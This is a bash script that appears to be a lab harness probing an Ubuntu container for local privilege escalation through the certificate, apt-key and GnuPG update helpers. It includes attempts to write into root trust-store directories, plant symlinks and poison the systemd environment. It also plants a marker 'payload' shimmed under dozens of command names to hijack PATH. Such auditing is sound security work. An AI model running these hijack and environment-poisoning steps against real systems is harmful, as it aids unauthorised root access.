#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"
APT_NETWORK_PROBE="${APT_NETWORK_PROBE:-1}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/trust-store-gnupg.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n## %s\n' "$1"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" -e APT_NETWORK_PROBE="$APT_NETWORK_PROBE" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "GnuPG/apt-key/ca-certificates trust-store update helper probe"
echo "target=$TARGET attacker=$ATTACKER apt_network_probe=$APT_NETWORK_PROBE"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=trust_store_gnupg_probe
runuser -u "$ATTACKER" -- env GNUPGHOME="/home/${ATTACKER}/${probe}/gnupg" gpgconf --kill all 2>/dev/null || true
rm -rf "/home/${ATTACKER}/${probe}" \
  /tmp/${probe}* \
  /tmp/tsg-apt-lists \
  /tmp/tsg-root-apt-key* \
  /root/${probe}* 2>/dev/null || true
systemctl reset-failed apt-daily.service apt-daily-upgrade.service apt-news.service esm-cache.service 2>/dev/null || true
true
TARGET

target_root "target identity and default packages" <<'TARGET'
set +e
echo "== identity =="
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
getent group sudo admin adm staff syslog 2>/dev/null || true
runuser -u "$ATTACKER" -- bash -lc 'id; groups; command -v sudo >/dev/null && sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== package versions =="
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
  apt apt-utils debconf ca-certificates openssl gnupg gnupg-utils gpg gpgv \
  gpg-agent dirmngr gpgconf gpg-wks-client keyboxd ubuntu-keyring \
  debian-archive-keyring python3 systemd packagekit 2>/dev/null | sort

echo
echo "== kernel link protections and temp roots =="
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_fifos fs.protected_regular 2>/dev/null || true
for p in /tmp /var/tmp /run /run/user "/run/user/$(id -u "$ATTACKER" 2>/dev/null)" /home "$HOME"; do
  [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %a %U:%G %F %n -> %N' "$p" 2>/dev/null || echo "MISSING $p"
done
TARGET

target_root "default root consumers and trust-store configuration" <<'TARGET'
set +e
echo "== apt hooks and keyring config =="
apt-config dump | grep -Ei '(trusted|keyring|gpg|apt-key|pre-invoke|post-invoke|debconf|Dir::Etc|Dir::State)' | sort
find /etc/apt/apt.conf.d -maxdepth 1 -type f -print | sort |
  xargs -r grep -HnE '(Pre-Invoke|Post-Invoke|DPkg::|APT::Update|apt-key|gpg|gpgv|dpkg-preconfigure|update-ca|ca-cert|systemctl|appstreamcli|touch|rm)' || true
grep -RInE '(^deb|Signed-By|signed-by|trusted.gpg|keyring)' /etc/apt/sources.list /etc/apt/sources.list.d 2>/dev/null || true

echo
echo "== root systemd environment and apt timers =="
systemctl show-environment 2>/dev/null | sort || true
for u in apt-daily.service apt-daily-upgrade.service apt-daily.timer apt-daily-upgrade.timer apt-news.service esm-cache.service; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p Result -p FragmentPath -p User -p Group -p Environment \
    -p PassEnvironment -p ExecStart "$u" 2>&1 || true
done

echo
echo "== ca-certificates dpkg consumers =="
for f in /var/lib/dpkg/info/ca-certificates.postinst \
  /var/lib/dpkg/info/ca-certificates.triggers \
  /var/lib/dpkg/info/ca-certificates.config \
  /var/lib/dpkg/info/ca-certificates.postrm; do
  echo "### $f"
  if [ -e "$f" ]; then
    stat -Lc '%A %a %U:%G %n' "$f"
    sed -n '1,180p' "$f"
  else
    echo MISSING
  fi
done

echo
echo "== ca-certificates hooks =="
find /etc/ca-certificates/update.d -maxdepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
run-parts --test -- /etc/ca-certificates/update.d 2>&1 || true

echo
echo "== gnupg user services shipped by default =="
systemctl --user --global list-unit-files --no-pager --plain 2>/dev/null | grep -Ei 'gpg|dirmngr|keybox' || true
for u in gpg-agent.socket gpg-agent-extra.socket gpg-agent-browser.socket gpg-agent-ssh.socket \
  gpg-agent.service dirmngr.socket dirmngr.service keyboxd.socket keyboxd.service; do
  echo "### $u"
  systemctl --user --global cat "$u" 2>/dev/null || true
done

echo
echo "== live gnupg processes and sockets =="
ps -eo pid,user,comm,args | grep -Ei 'gpg-agent|dirmngr|keyboxd' | grep -v grep || true
find /run /home "$HOME" -xdev \( -name 'S.gpg-agent*' -o -name 'S.dirmngr' -o -name 'S.keyboxd' \) \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
TARGET

target_root "implementation excerpts for env, hook, tmp, and symlink boundaries" <<'TARGET'
set +e
echo "== update-ca-certificates relevant lines =="
nl -ba /usr/sbin/update-ca-certificates | sed -n '20,190p'

echo
echo "== apt-key relevant lines =="
nl -ba /usr/bin/apt-key | sed -n '60,90p;309,370p;647,760p;801,838p'

echo
echo "== debconf apt preconfigure relevant lines =="
nl -ba /usr/sbin/dpkg-preconfigure | sed -n '1,110p;156,183p'
TARGET

target_root "ownership and writable boundary map" <<'TARGET'
set +e
echo "== root trust-store paths =="
paths='/etc/ca-certificates /etc/ca-certificates/update.d /etc/ssl /etc/ssl/certs /etc/ssl/certs/ca-certificates.crt /usr/share/ca-certificates /usr/local /usr/local/share /usr/local/share/ca-certificates /etc/apt /etc/apt/apt.conf.d /etc/apt/trusted.gpg /etc/apt/trusted.gpg.d /etc/apt/keyrings /usr/share/keyrings /etc/gnupg /usr/lib/gnupg /usr/lib/systemd/user /etc/systemd/user /var/cache/debconf /var/cache/debconf/tmp.ci /var/lib/dpkg/info /var/lib/apt/lists /var/lib/apt/lists/partial'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p"
  else
    echo "MISSING $p"
  fi
done

echo
echo "== keyring files =="
find /etc/apt/trusted.gpg.d /etc/apt/keyrings /usr/share/keyrings -maxdepth 1 \
  \( -type f -o -type l -o -type d \) -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort

echo
echo "== sample cert symlinks =="
find /etc/ssl/certs -maxdepth 1 -type l -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort | sed -n '1,80p'

echo
echo "== attacker writability =="
runuser -u "$ATTACKER" -- bash -s <<'ATTACKER'
set +e
id
paths='/etc/ca-certificates/update.d /usr/share/ca-certificates /usr/local/share/ca-certificates /etc/ssl/certs /etc/apt/apt.conf.d /etc/apt/trusted.gpg.d /etc/apt/keyrings /usr/share/keyrings /etc/gnupg /usr/lib/gnupg /usr/lib/systemd/user /etc/systemd/user /var/cache/debconf /var/cache/debconf/tmp.ci /var/lib/dpkg/info /var/lib/apt/lists /var/lib/apt/lists/partial /tmp /var/tmp'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    if [ -w "$p" ]; then echo "W $p"; else echo "NO_W $p"; fi
  else
    echo "MISSING $p"
  fi
done
ATTACKER
TARGET

target_attacker "attacker write, symlink, and trigger attempts" <<'ATTACKER'
set +e
probe=trust_store_gnupg_probe
base="$HOME/$probe"
rm -rf "$base"
mkdir -p "$base/bin" "$base/tmp" "$base/gnupg" "$base/etcssl/certs" "$base/hooks" "$base/localcerts"
chmod 700 "$base/gnupg"

try_file() {
  local p="$1"
  printf 'write %s -> ' "$p"
  if bash -c 'printf "probe\n" > "$1"' bash "$p" 2>"$base/write.err"; then
    echo OK
    rm -f "$p"
  else
    sed -n '1p' "$base/write.err"
  fi
  rm -f "$base/write.err"
}

try_link() {
  local p="$1"
  printf 'symlink %s -> ' "$p"
  if ln -s /root/trust_store_gnupg_probe_link_target "$p" 2>"$base/link.err"; then
    echo OK
    rm -f "$p"
  else
    sed -n '1p' "$base/link.err"
  fi
  rm -f "$base/link.err"
}

echo "== write attempts into root trust/code directories =="
try_file /etc/ca-certificates/update.d/zz-trust-store-gnupg-probe
try_file /usr/local/share/ca-certificates/trust-store-gnupg-probe.crt
try_file /usr/share/ca-certificates/trust-store-gnupg-probe.crt
try_file /etc/apt/apt.conf.d/01trust-store-gnupg-probe
try_file /etc/apt/trusted.gpg.d/trust-store-gnupg-probe.gpg
try_file /etc/apt/keyrings/trust-store-gnupg-probe.gpg
try_file /usr/share/keyrings/trust-store-gnupg-probe.gpg
try_file /var/cache/debconf/tmp.ci/trust-store-gnupg-probe
try_link /etc/ssl/certs/ca-certificates.crt.new
try_link /etc/ssl/certs/trust-store-gnupg-probe.pem
try_link /etc/apt/trusted.gpg.d/trust-store-gnupg-probe.gpg
try_link /var/cache/debconf/tmp.ci

echo
echo "== plant hostile PATH/GnuPG payloads in attacker-owned tree =="
cat > "$base/bin/payload" <<'EOF'
#!/bin/sh
cmd="${0##*/}"
euid="$(/usr/bin/id -u 2>/dev/null || echo unknown)"
ruid="$(/usr/bin/id -ru 2>/dev/null || echo unknown)"
{
  printf 'PAYLOAD cmd=%s euid=%s ruid=%s argv=' "$cmd" "$euid" "$ruid"
  printf '%s ' "$@"
  printf '\n'
  /usr/bin/id
} >> /tmp/trust_store_gnupg_probe_payload_hits 2>&1
if [ "$euid" = "0" ]; then
  {
    echo "ROOT PAYLOAD cmd=$cmd"
    /usr/bin/id
  } > /root/trust_store_gnupg_probe_root_payload_marker 2>&1
fi
exit 127
EOF
chmod 755 "$base/bin/payload"
for name in apt-config apt-extracttemplates apt-key awk base64 basename cat chmod cmp command cut date \
  dirname dirmngr dpkg-preconfigure find gpg gpg-agent gpgconf gpgv grep head id keyboxd ln \
  mktemp mv openssl readlink rm run-parts sed sh sort stat systemctl test touch tr uname wc wget xargs; do
  ln -sf payload "$base/bin/$name"
done
ls -l "$base/bin" | sed -n '1,80p'

echo
echo "== user-scoped env hijacks stay uid1001 =="
PATH="$base/bin:/usr/bin:/bin" TMPDIR="$base/tmp" GNUPGHOME="$base/gnupg" /usr/bin/apt-key list >/tmp/${probe}_user_apt_key_list.out 2>&1
echo "apt_key_list_rc=$?"
sed -n '1,60p' /tmp/${probe}_user_apt_key_list.out
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TMPDIR="$base/tmp" GNUPGHOME="$base/gnupg" /usr/bin/apt-key add /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg >/tmp/${probe}_user_apt_key_add_default_path.out 2>&1
echo "apt_key_add_default_path_rc=$?"
sed -n '1,40p' /tmp/${probe}_user_apt_key_add_default_path.out
PATH="$base/bin:/usr/bin:/bin" TMPDIR="$base/tmp" GNUPGHOME="$base/gnupg" /usr/bin/apt-key add /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg >/tmp/${probe}_user_apt_key_add.out 2>&1
echo "apt_key_add_rc=$?"
sed -n '1,40p' /tmp/${probe}_user_apt_key_add.out
PATH="$base/bin:/usr/sbin:/usr/bin:/bin" TMPDIR="$base/tmp" /usr/sbin/update-ca-certificates \
  --certsconf /dev/null \
  --certsdir "$base/localcerts" \
  --localcertsdir "$base/localcerts" \
  --etccertsdir "$base/etcssl/certs" \
  --hooksdir "$base/hooks" >/tmp/${probe}_user_update_ca.out 2>&1
echo "user_update_ca_rc=$?"
sed -n '1,80p' /tmp/${probe}_user_update_ca.out

echo
echo "== attacker GnuPG socket scope =="
GNUPGHOME="$base/gnupg" gpgconf --list-dirs 2>&1 | sed -n '1,80p'
GNUPGHOME="$base/gnupg" gpg --list-keys >/tmp/${probe}_user_gpg.out 2>&1
echo "user_gpg_list_rc=$?"
sed -n '1,80p' /tmp/${probe}_user_gpg.out
find "$base/gnupg" -maxdepth 2 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort

echo
echo "== unprivileged attempts to poison root systemd/apt env =="
systemctl set-environment "PATH=$base/bin:/usr/bin:/bin" 2>&1
echo "set_path_rc=$?"
systemctl set-environment "TMPDIR=$base/tmp" 2>&1
echo "set_tmpdir_rc=$?"
TMPDIR="$base/tmp" GNUPGHOME="$base/gnupg" systemctl import-environment TMPDIR GNUPGHOME 2>&1
echo "import_env_rc=$?"
systemctl start apt-daily.service 2>&1
echo "start_apt_daily_rc=$?"
TMPDIR="$base/tmp" GNUPGHOME="$base/gnupg" apt-get update -qq 2>&1 | sed -n '1,40p'
echo "user_apt_update_rc=${PIPESTATUS[0]}"

echo
echo "== payload hits after user-only actions =="
cat /tmp/${probe}_payload_hits 2>/dev/null || echo NO_PAYLOAD_HITS_YET
ATTACKER

target_root "root default trigger checks after hostile user state is planted" <<'TARGET'
set +e
probe=trust_store_gnupg_probe
base="/home/${ATTACKER}/${probe}"
rm -f "/tmp/${probe}_payload_hits" "/root/${probe}_root_payload_marker"

echo "== root environment before default triggers =="
id
env | sort
systemctl show-environment 2>/dev/null | sort || true

echo
echo "== root ca-certificates trigger path =="
env -i HOME=/root LOGNAME=root USER=root SHELL=/bin/sh \
  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
  /var/lib/dpkg/info/ca-certificates.postinst triggered update-ca-certificates \
  >/tmp/${probe}_root_update_ca.out 2>&1
echo "root_update_ca_rc=$?"
sed -n '1,120p' /tmp/${probe}_root_update_ca.out

echo
echo "== root apt-key list path =="
before="$(find /tmp -maxdepth 1 -name 'apt-key-gpghome.*' -printf '%f\n' 2>/dev/null | sort | wc -l)"
env -i HOME=/root LOGNAME=root USER=root SHELL=/bin/sh APT_KEY_DONT_WARN_ON_DANGEROUS_USAGE=1 \
  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
  apt-key list >/tmp/${probe}_root_apt_key_list.out 2>/tmp/${probe}_root_apt_key_list.err
echo "root_apt_key_list_rc=$?"
after="$(find /tmp -maxdepth 1 -name 'apt-key-gpghome.*' -printf '%f\n' 2>/dev/null | sort | wc -l)"
echo "apt_key_gpghome_tmp_count before=$before after=$after"
sed -n '1,20p' /tmp/${probe}_root_apt_key_list.err
sed -n '1,80p' /tmp/${probe}_root_apt_key_list.out

echo
echo "== root apt update/gpgv consumer =="
if [ "${APT_NETWORK_PROBE:-1}" = "1" ]; then
  rm -rf /tmp/${probe}_apt_lists
  mkdir -p /tmp/${probe}_apt_lists/partial
  chmod 755 /tmp/${probe}_apt_lists /tmp/${probe}_apt_lists/partial
  env -i HOME=/root LOGNAME=root USER=root SHELL=/bin/sh \
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
    timeout 90s apt-get \
      -o Dir::State::lists=/tmp/${probe}_apt_lists \
      -o Debug::Acquire::gpgv=true \
      update >/tmp/${probe}_root_apt_update.out 2>&1
  rc=$?
  echo "root_apt_update_rc=$rc"
  grep -E 'Preparing to exec:|apt-key|gpgv|GOODSIG|VALIDSIG|Signed-By|keyring|Err:|Failed|Interactive|Access denied' \
    /tmp/${probe}_root_apt_update.out | sed -n '1,220p'
else
  echo "SKIPPED root apt update because APT_NETWORK_PROBE=$APT_NETWORK_PROBE"
fi

echo
echo "== root marker check =="
if [ -s /tmp/${probe}_payload_hits ]; then
  echo "PAYLOAD_HITS_PRESENT"
  cat /tmp/${probe}_payload_hits
else
  echo "NO_PAYLOAD_HITS_FROM_ROOT_TRIGGERS"
fi
if [ -e /root/${probe}_root_payload_marker ]; then
  echo "ROOT_PAYLOAD_MARKER_PRESENT"
  cat /root/${probe}_root_payload_marker
else
  echo "NO_ROOT_PAYLOAD_MARKER"
fi

echo
echo "== post-trigger trust-store state =="
for p in /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ca-certificates.crt.new \
  /etc/ca-certificates/update.d /usr/local/share/ca-certificates \
  /etc/apt/trusted.gpg.d /etc/apt/keyrings /usr/share/keyrings /root/.gnupg "$base"; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p"
  else
    echo "MISSING $p"
  fi
done
find "$base" -maxdepth 2 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort | sed -n '1,120p'
TARGET

target_root "cleanup after probe" <<'TARGET'
set +e
probe=trust_store_gnupg_probe
runuser -u "$ATTACKER" -- env GNUPGHOME="/home/${ATTACKER}/${probe}/gnupg" gpgconf --kill all 2>/dev/null || true
rm -rf "/home/${ATTACKER}/${probe}" \
  /tmp/${probe}* \
  /tmp/tsg-apt-lists \
  /tmp/tsg-root-apt-key* \
  /root/${probe}* 2>/dev/null || true
systemctl reset-failed apt-daily.service apt-daily-upgrade.service apt-news.service esm-cache.service 2>/dev/null || true
echo cleanup_done
TARGET
